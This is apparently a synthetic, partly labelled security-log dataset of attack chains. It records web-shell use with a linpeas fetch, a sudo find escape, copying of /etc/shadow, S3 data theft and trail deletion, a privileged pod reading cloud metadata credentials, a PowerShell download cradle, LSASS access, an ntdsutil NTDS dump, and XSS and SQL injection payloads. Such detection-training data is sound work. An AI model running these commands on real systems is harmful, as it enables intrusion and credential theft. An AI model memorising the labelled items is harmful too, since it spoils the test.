{"time": "2026-10-06T02:14:15Z", "index": "web", "sourcetype": "proxy", "src_ip": "146.70.112.45", "dest_url": "http://corp-web.local/admin/uploads/shell.php?cmd=whoami", "method": "GET", "status": 200, "bytes_out": 45}
{"time": "2026-10-06T02:14:22Z", "index": "linux", "sourcetype": "linux_secure", "host": "WEB-FRONTEND-02", "process": "apache2", "message": "Executing command: whoami; result: www-data"}
{"time": "2026-10-06T02:15:00Z", "index": "web", "sourcetype": "proxy", "src_ip": "146.70.112.45", "dest_url": "http://corp-web.local/admin/uploads/shell.php?cmd=wget+http%3A%2F%2F146.70.112.45%2Flinpeas.sh+-O+%2Ftmp%2Flinpeas.sh", "method": "GET", "status": 200, "bytes_out": 125}
{"time": "2026-10-06T02:15:10Z", "index": "linux", "sourcetype": "bash_history", "host": "WEB-FRONTEND-02", "user": "www-data", "command": "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh"}
{"time": "2026-10-06T02:22:00Z", "index": "linux", "sourcetype": "bash_history", "host": "WEB-FRONTEND-02", "user": "www-data", "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"}
{"time": "2026-10-06T02:25:33Z", "index": "linux", "sourcetype": "linux_secure", "host": "WEB-FRONTEND-02", "process": "sudo", "message": "www-data : TTY=pts/1 ; PWD=/var/www/html/admin/uploads ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh \\; -quit"}
{"time": "2026-10-06T02:26:01Z", "index": "linux", "sourcetype": "bash_history", "host": "WEB-FRONTEND-02", "user": "root", "command": "cat /etc/shadow > /tmp/sh.bak"}
{"time": "2026-10-06T02:28:10Z", "index": "network", "sourcetype": "firewall", "src_ip": "10.0.5.22", "src_port": 44112, "dest_ip": "146.70.112.45", "dest_port": 4444, "action": "allowed", "protocol": "tcp", "app": "unknown", "bytes_out": 150000, "bytes_in": 120}
{"time": "2026-10-06T04:10:00Z", "index": "cloud", "sourcetype": "aws:cloudtrail", "eventName": "AssumeRole", "userAgent": "aws-cli/2.0", "sourceIPAddress": "198.51.100.99", "userIdentity": {"type": "IAMUser", "userName": "dev.contractor"}, "requestParameters": {"roleArn": "arn:aws:iam::123456789012:role/S3BackupAdminRole"}}
{"time": "2026-10-06T04:12:33Z", "index": "cloud", "sourcetype": "aws:cloudtrail", "eventName": "ListBuckets", "userAgent": "aws-cli/2.0", "sourceIPAddress": "198.51.100.99", "userIdentity": {"type": "AssumedRole", "principalId": "AROAJ7XU12345:dev.contractor"}}
{"time": "2026-10-06T04:15:12Z", "index": "cloud", "sourcetype": "aws:cloudtrail", "eventName": "PutBucketPolicy", "userAgent": "aws-cli/2.0", "sourceIPAddress": "198.51.100.99", "requestParameters": {"bucketName": "corp-customer-pii", "policy": "{\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::corp-customer-pii/*\"}]}"}}
{"time": "2026-10-06T04:20:01Z", "index": "cloud", "sourcetype": "aws:s3", "eventName": "GetObject", "bucketName": "corp-customer-pii", "objectKey": "users_2026.csv", "sourceIPAddress": "198.51.100.99", "bytesTransferredOut": 45000000}
{"time": "2026-10-06T04:21:05Z", "index": "cloud", "sourcetype": "aws:s3", "eventName": "GetObject", "bucketName": "corp-customer-pii", "objectKey": "credit_cards_raw.bak", "sourceIPAddress": "198.51.100.99", "bytesTransferredOut": 120000000}
{"time": "2026-10-06T04:30:00Z", "index": "cloud", "sourcetype": "aws:cloudtrail", "eventName": "DeleteTrail", "userAgent": "aws-cli/2.0", "sourceIPAddress": "198.51.100.99", "requestParameters": {"name": "arn:aws:cloudtrail:us-east-1:123456789012:trail/security-trail-main"}}
{"time": "2026-10-06T07:05:00Z", "index": "container", "sourcetype": "kubernetes:audit", "verb": "create", "user": {"username": "system:serviceaccount:default:ci-cd-bot"}, "resource": "pods", "namespace": "production", "name": "nginx-debug-pod", "requestObject": {"spec": {"containers": [{"name": "debug", "image": "alpine:latest", "securityContext": {"privileged": true}, "volumeMounts": [{"mountPath": "/host", "name": "host-root"}]}]}}}
{"time": "2026-10-06T07:06:12Z", "index": "container", "sourcetype": "kubernetes:audit", "verb": "create", "user": {"username": "system:serviceaccount:default:ci-cd-bot"}, "resource": "pods/exec", "namespace": "production", "name": "nginx-debug-pod"}
{"time": "2026-10-06T07:07:00Z", "index": "linux", "sourcetype": "bash_history", "host": "WORKER-NODE-03", "user": "root", "command": "chroot /host"}
{"time": "2026-10-06T07:08:15Z", "index": "linux", "sourcetype": "bash_history", "host": "WORKER-NODE-03", "user": "root", "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/KubeWorkerRole"}
{"time": "2026-10-06T07:10:00Z", "index": "network", "sourcetype": "firewall", "src_ip": "10.10.5.55", "src_port": 34112, "dest_ip": "203.0.113.200", "dest_port": 8080, "action": "allowed", "protocol": "tcp", "app": "http", "bytes_out": 2500, "bytes_in": 120}
{"time": "2026-10-06T09:15:00Z", "index": "windows", "sourcetype": "WinEventLog:Security", "EventCode": 4624, "host": "DC-02", "user": "CORP\\j.doe", "src_ip": "10.0.1.155", "logon_type": 3, "auth_package": "NTLM", "status": "Success"}
{"time": "2026-10-06T09:15:02Z", "index": "windows", "sourcetype": "WinEventLog:Security", "EventCode": 4672, "host": "DC-02", "user": "CORP\\j.doe", "privilege_list": "SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege"}
{"time": "2026-10-06T09:16:00Z", "index": "windows", "sourcetype": "WinEventLog:Security", "EventCode": 4697, "host": "DC-02", "user": "CORP\\j.doe", "service_name": "WinRM_Updater", "service_file_name": "C:\\Windows\\Temp\\beacon.exe", "service_type": "user mode service", "service_start_type": "demand start"}
{"time": "2026-10-06T09:16:05Z", "index": "windows", "sourcetype": "WinEventLog:Security", "EventCode": 7045, "host": "DC-02", "user": "SYSTEM", "service_name": "WinRM_Updater", "image_path": "C:\\Windows\\Temp\\beacon.exe"}
{"time": "2026-10-06T09:17:00Z", "index": "windows", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "EventCode": 1, "host": "DC-02", "user": "NT AUTHORITY\\SYSTEM", "process_name": "beacon.exe", "parent_process": "services.exe", "command_line": "C:\\Windows\\Temp\\beacon.exe"}
{"time": "2026-10-06T09:18:00Z", "index": "windows", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "EventCode": 8, "host": "DC-02", "user": "NT AUTHORITY\\SYSTEM", "source_process": "C:\\Windows\\Temp\\beacon.exe", "target_process": "C:\\Windows\\System32\\svchost.exe", "start_address": "0x0000000002A30000"}
{"time": "2026-10-06T09:20:00Z", "index": "network", "sourcetype": "firewall", "src_ip": "10.0.1.5", "src_port": 49221, "dest_ip": "172.67.199.12", "dest_port": 443, "action": "allowed", "protocol": "tcp", "app": "ssl", "bytes_out": 1500, "bytes_in": 45000}
{"time": "2026-10-06T09:25:00Z", "index": "dns", "sourcetype": "dns", "src_ip": "10.0.1.5", "query": "update33.microsoft-windows-updater.com", "record_type": "A", "response_code": "NOERROR", "answer": "172.67.199.12"}
{"time": "2026-10-05T14:00:01Z", "index": "windows", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "EventCode": 1, "host": "WKSTN-2099", "user": "CORP\\b.wayne", "process_name": "cmd.exe", "parent_process": "explorer.exe", "command_line": "cmd.exe /c wscript.exe C:\\Users\\b.wayne\\Downloads\\Q3_Earnings_Report.vbs"}
{"time": "2026-10-05T14:00:03Z", "index": "windows", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "EventCode": 1, "host": "WKSTN-2099", "user": "CORP\\b.wayne", "process_name": "wscript.exe", "parent_process": "cmd.exe", "command_line": "wscript.exe C:\\Users\\b.wayne\\Downloads\\Q3_Earnings_Report.vbs"}
{"time": "2026-10-05T14:00:05Z", "index": "windows", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "EventCode": 1, "host": "WKSTN-2099", "user": "CORP\\b.wayne", "process_name": "powershell.exe", "parent_process": "wscript.exe", "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA..."}
{"time": "2026-10-05T14:00:08Z", "index": "windows", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "EventCode": 3, "host": "WKSTN-2099", "user": "CORP\\b.wayne", "process_name": "powershell.exe", "src_ip": "10.0.2.15", "dest_ip": "45.33.32.156", "dest_port": 443, "protocol": "tcp"}
{"time": "2026-10-05T14:00:08Z", "index": "network", "sourcetype": "firewall", "src_ip": "10.0.2.15", "src_port": 53444, "dest_ip": "45.33.32.156", "dest_port": 443, "action": "allowed", "protocol": "tcp", "app": "ssl", "bytes_out": 405, "bytes_in": 125000}
{"time": "2026-10-05T14:00:15Z", "index": "windows", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "EventCode": 11, "host": "WKSTN-2099", "user": "CORP\\b.wayne", "process_name": "powershell.exe", "file_name": "C:\\Users\\b.wayne\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDriveUpdate.exe"}
{"time": "2026-10-05T14:00:17Z", "index": "windows", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "EventCode": 1, "host": "WKSTN-2099", "user": "CORP\\b.wayne", "process_name": "OneDriveUpdate.exe", "parent_process": "powershell.exe", "command_line": "\"C:\\Users\\b.wayne\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDriveUpdate.exe\"", "hash": "SHA256=11A2B3C4D5E6F7890123456789ABCDEF11A2B3C4D5E6F7890123456789ABCDEF"}
{"time": "2026-10-05T14:05:00Z", "index": "windows", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "EventCode": 3, "host": "WKSTN-2099", "user": "CORP\\b.wayne", "process_name": "OneDriveUpdate.exe", "src_ip": "10.0.2.15", "dest_ip": "45.33.32.156", "dest_port": 443, "protocol": "tcp"}
{"time": "2026-10-05T14:05:00Z", "index": "network", "sourcetype": "firewall", "src_ip": "10.0.2.15", "src_port": 53488, "dest_ip": "45.33.32.156", "dest_port": 443, "action": "allowed", "protocol": "tcp", "app": "ssl", "bytes_out": 120, "bytes_in": 150}
{"time": "2026-10-05T14:10:00Z", "index": "windows", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "EventCode": 3, "host": "WKSTN-2099", "user": "CORP\\b.wayne", "process_name": "OneDriveUpdate.exe", "src_ip": "10.0.2.15", "dest_ip": "45.33.32.156", "dest_port": 443, "protocol": "tcp"}
{"time": "2026-10-05T14:10:00Z", "index": "network", "sourcetype": "firewall", "src_ip": "10.0.2.15", "src_port": 53512, "dest_ip": "45.33.32.156", "dest_port": 443, "action": "allowed", "protocol": "tcp", "app": "ssl", "bytes_out": 120, "bytes_in": 150}
{"time": "2026-10-04T08:15:02Z", "index": "security", "sourcetype": "email", "action": "delivered", "sender": "billing@amaz0n-support.com", "recipient": "jsmith@corp.local", "subject": "Urgent: Invoice Overdue", "attachment": "invoice_oct.doc", "message_id": "11029384A"}
{"time": "2026-10-04T08:17:45Z", "index": "web", "sourcetype": "proxy", "src_ip": "10.0.1.44", "user": "jsmith", "dest_url": "http://198.51.100.22/payload.ps1", "http_method": "GET", "status": 200, "bytes_in": 4500, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
{"time": "2026-10-04T08:17:46Z", "index": "windows", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "EventCode": 1, "host": "WKSTN-1044", "user": "CORP\\jsmith", "process_name": "powershell.exe", "parent_process": "winword.exe", "command_line": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.22/payload.ps1')\"", "hash": "SHA256=9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08"}
{"time": "2026-10-04T08:17:48Z", "index": "network", "sourcetype": "firewall", "src_ip": "10.0.1.44", "src_port": 50122, "dest_ip": "198.51.100.22", "dest_port": 80, "action": "allowed", "protocol": "tcp", "app": "web", "bytes_out": 210, "bytes_in": 4500}
{"time": "2026-10-04T08:18:05Z", "index": "windows", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "EventCode": 11, "host": "WKSTN-1044", "user": "CORP\\jsmith", "process_name": "powershell.exe", "file_name": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost.exe"}
{"time": "2026-10-04T08:18:10Z", "index": "windows", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "EventCode": 13, "host": "WKSTN-1044", "user": "CORP\\jsmith", "process_name": "powershell.exe", "target_object": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", "details": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost.exe"}
{"time": "2026-10-04T08:19:00Z", "index": "windows", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "EventCode": 10, "host": "WKSTN-1044", "user": "CORP\\jsmith", "source_process": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost.exe", "target_process": "C:\\Windows\\System32\\lsass.exe", "granted_access": "0x1fffff", "call_trace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d1a4"}
{"time": "2026-10-04T08:22:15Z", "index": "windows", "sourcetype": "WinEventLog:Security", "EventCode": 4624, "host": "DC-01", "user": "CORP\\svc_backup", "src_ip": "10.0.1.44", "logon_type": 3, "auth_package": "NTLM", "status": "Success"}
{"time": "2026-10-04T08:22:16Z", "index": "windows", "sourcetype": "WinEventLog:Security", "EventCode": 5140, "host": "DC-01", "user": "CORP\\svc_backup", "src_ip": "10.0.1.44", "share_name": "\\\\*\\IPC$", "access_mask": "0x1"}
{"time": "2026-10-04T08:23:05Z", "index": "windows", "sourcetype": "WinEventLog:Security", "EventCode": 4688, "host": "DC-01", "user": "CORP\\svc_backup", "process_name": "cmd.exe", "parent_process": "WmiPrvSE.exe", "command_line": "cmd.exe /c ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q"}
{"time": "2026-10-04T09:01:00Z", "index": "linux", "sourcetype": "linux_secure", "host": "WEB-FRONTEND-01", "process": "sshd", "message": "Failed password for root from 185.15.22.10 port 44211 ssh2"}
{"time": "2026-10-04T09:01:02Z", "index": "linux", "sourcetype": "linux_secure", "host": "WEB-FRONTEND-01", "process": "sshd", "message": "Failed password for admin from 185.15.22.10 port 44212 ssh2"}
{"time": "2026-10-04T09:01:45Z", "index": "linux", "sourcetype": "linux_secure", "host": "WEB-FRONTEND-01", "process": "sshd", "message": "Accepted password for dev_user from 185.15.22.10 port 44300 ssh2"}
{"time": "2026-10-04T09:02:10Z", "index": "linux", "sourcetype": "linux_secure", "host": "WEB-FRONTEND-01", "process": "sudo", "message": "dev_user : TTY=pts/0 ; PWD=/home/dev_user ; USER=root ; COMMAND=/bin/bash"}
{"time": "2026-10-04T09:05:00Z", "index": "network", "sourcetype": "firewall", "src_ip": "10.0.5.10", "src_port": 55111, "dest_ip": "185.15.22.10", "dest_port": 443, "action": "allowed", "protocol": "tcp", "app": "ssl", "bytes_out": 450000000, "bytes_in": 1200}
{"time": "2026-10-04T10:00:00Z", "index": "cloud", "sourcetype": "aws:cloudtrail", "eventName": "ConsoleLogin", "userAgent": "Mozilla/5.0", "sourceIPAddress": "203.0.113.5", "userIdentity": {"type": "IAMUser", "userName": "j.doe"}, "responseElements": {"ConsoleLogin": "Success"}}
{"time": "2026-10-04T10:05:12Z", "index": "cloud", "sourcetype": "aws:cloudtrail", "eventName": "AttachUserPolicy", "userAgent": "aws-cli/2.0", "sourceIPAddress": "203.0.113.5", "requestParameters": {"policyArn": "arn:aws:iam::aws:policy/AdministratorAccess", "userName": "j.doe"}}
{"time": "2026-10-04T10:10:33Z", "index": "cloud", "sourcetype": "aws:cloudtrail", "eventName": "ListBuckets", "userAgent": "aws-cli/2.0", "sourceIPAddress": "203.0.113.5"}
{"time": "2026-10-04T10:15:01Z", "index": "cloud", "sourcetype": "aws:s3", "eventName": "GetObject", "bucketName": "corp-customer-pii-backup", "objectKey": "2026_db_dump.sql", "sourceIPAddress": "203.0.113.5"}
{"time": "2026-10-04T11:00:00Z", "index": "windows", "sourcetype": "WinEventLog:Security", "EventCode": 4624, "host": "FILE-SRV-01", "user": "CORP\\m.manager", "src_ip": "10.0.1.88", "logon_type": 3}
{"time": "2026-10-04T11:05:00Z", "index": "windows", "sourcetype": "WinEventLog:Security", "EventCode": 5140, "host": "FILE-SRV-01", "user": "CORP\\m.manager", "share_name": "\\\\*\\HR_Confidential", "access_mask": "0x1"}
{"time": "2026-10-04T11:30:00Z", "index": "network", "sourcetype": "proxy", "src_ip": "10.0.1.88", "user": "m.manager", "dest_url": "https://personal-dropbox-upload.com/api/v1/sync", "http_method": "POST", "bytes_out": 850000000}
{"timestamp":"2026-09-20T11:00:00Z","date":"2026-09-20","time":"11:00:00","s_ip":"203.0.113.10","c_ip":"203.0.113.10","s_port":443,"cs_method":"GET","cs_uri_stem":"/search","cs_uri_query":"q=%3Cscript%3Ealert(1)%3C/script%3E","cs_User_Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/154.0 Safari/537.36","sc_status":"400","sc_substatus":0,"sc_win32_status":0,"time_taken":86,"host":"myapp.cybsec.lab","site_name":"Default Web Site","event_id":121,"source":"iis","sourcetype":"iis","ground_truth":"XSS"}
{"timestamp":"2026-09-20T11:01:00Z","date":"2026-09-20","time":"11:01:00","s_ip":"203.0.113.10","c_ip":"203.0.113.10","s_port":443,"cs_method":"GET","cs_uri_stem":"/search","cs_uri_query":"q=%3Cscript%3Ealert(1)%3C/script%3E","cs_User_Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/154.0 Safari/537.36","sc_status":"400","sc_substatus":0,"sc_win32_status":0,"time_taken":430,"host":"myapp.cybsec.lab","site_name":"Default Web Site","event_id":122,"source":"iis","sourcetype":"iis","ground_truth":"XSS"}
{"timestamp":"2026-09-20T11:02:00Z","date":"2026-09-20","time":"11:02:00","s_ip":"203.0.113.10","c_ip":"203.0.113.10","s_port":443,"cs_method":"POST","cs_uri_stem":"/comment","cs_uri_query":"text=<img src=x onerror=alert(1)>","cs_User_Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/154.0 Safari/537.36","sc_status":"200","sc_substatus":0,"sc_win32_status":0,"time_taken":523,"host":"myapp.cybsec.lab","site_name":"Default Web Site","event_id":123,"source":"iis","sourcetype":"iis","ground_truth":"XSS"}
{"timestamp":"2026-09-20T11:02:00Z","date":"2026-09-20","time":"11:02:00","s_ip":"203.0.113.11","c_ip":"203.0.113.11","s_port":443,"cs_method":"POST","cs_uri_stem":"/login","cs_uri_query":"username=admin' OR 1=1 --&password=x","cs_User_Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/154.0 Safari/537.36","sc_status":"401","sc_substatus":0,"sc_win32_status":0,"time_taken":175,"host":"myapp.cybsec.lab","site_name":"Default Web Site","event_id":129,"source":"iis","sourcetype":"iis","ground_truth":"SQL Injection"}
{"timestamp":"2026-09-20T11:03:00Z","date":"2026-09-20","time":"11:03:00","s_ip":"203.0.113.10","c_ip":"203.0.113.10","s_port":443,"cs_method":"POST","cs_uri_stem":"/comment","cs_uri_query":"text=<img src=x onerror=alert(1)>","cs_User_Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/154.0 Safari/537.36","sc_status":"200","sc_substatus":0,"sc_win32_status":0,"time_taken":95,"host":"myapp.cybsec.lab","site_name":"Default Web Site","event_id":124,"source":"iis","sourcetype":"iis","ground_truth":"XSS"}
{"timestamp":"2026-09-20T11:03:00Z","date":"2026-09-20","time":"11:03:00","s_ip":"203.0.113.11","c_ip":"203.0.113.11","s_port":443,"cs_method":"POST","cs_uri_stem":"/login","cs_uri_query":"username=admin' OR 1=1 --&password=x","cs_User_Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/154.0 Safari/537.36","sc_status":"401","sc_substatus":0,"sc_win32_status":0,"time_taken":172,"host":"myapp.cybsec.lab","site_name":"Default Web Site","event_id":130,"source":"iis","sourcetype":"iis","ground_truth":"SQL Injection"}
{"timestamp":"2026-09-20T11:04:00Z","date":"2026-09-20","time":"11:04:00","s_ip":"203.0.113.10","c_ip":"203.0.113.10","s_port":443,"cs_method":"GET","cs_uri_stem":"/profile","cs_uri_query":"name=javascript:alert(1)","cs_User_Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/154.0 Safari/537.36","sc_status":"200","sc_substatus":0,"sc_win32_status":0,"time_taken":610,"host":"myapp.cybsec.lab","site_name":"Default Web Site","event_id":125,"source":"iis","sourcetype":"iis","ground_truth":"XSS"}
{"timestamp":"2026-09-20T11:04:00Z","date":"2026-09-20","time":"11:04:00","s_ip":"203.0.113.11","c_ip":"203.0.113.11","s_port":443,"cs_method":"GET","cs_uri_stem":"/products","cs_uri_query":"id=1 UNION SELECT username,password FROM users","cs_User_Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/154.0 Safari/537.36","sc_status":"500","sc_substatus":0,"sc_win32_status":0,"time_taken":850,"host":"myapp.cybsec.lab","site_name":"Default Web Site","event_id":131,"source":"iis","sourcetype":"iis","ground_truth":"SQL Injection"}
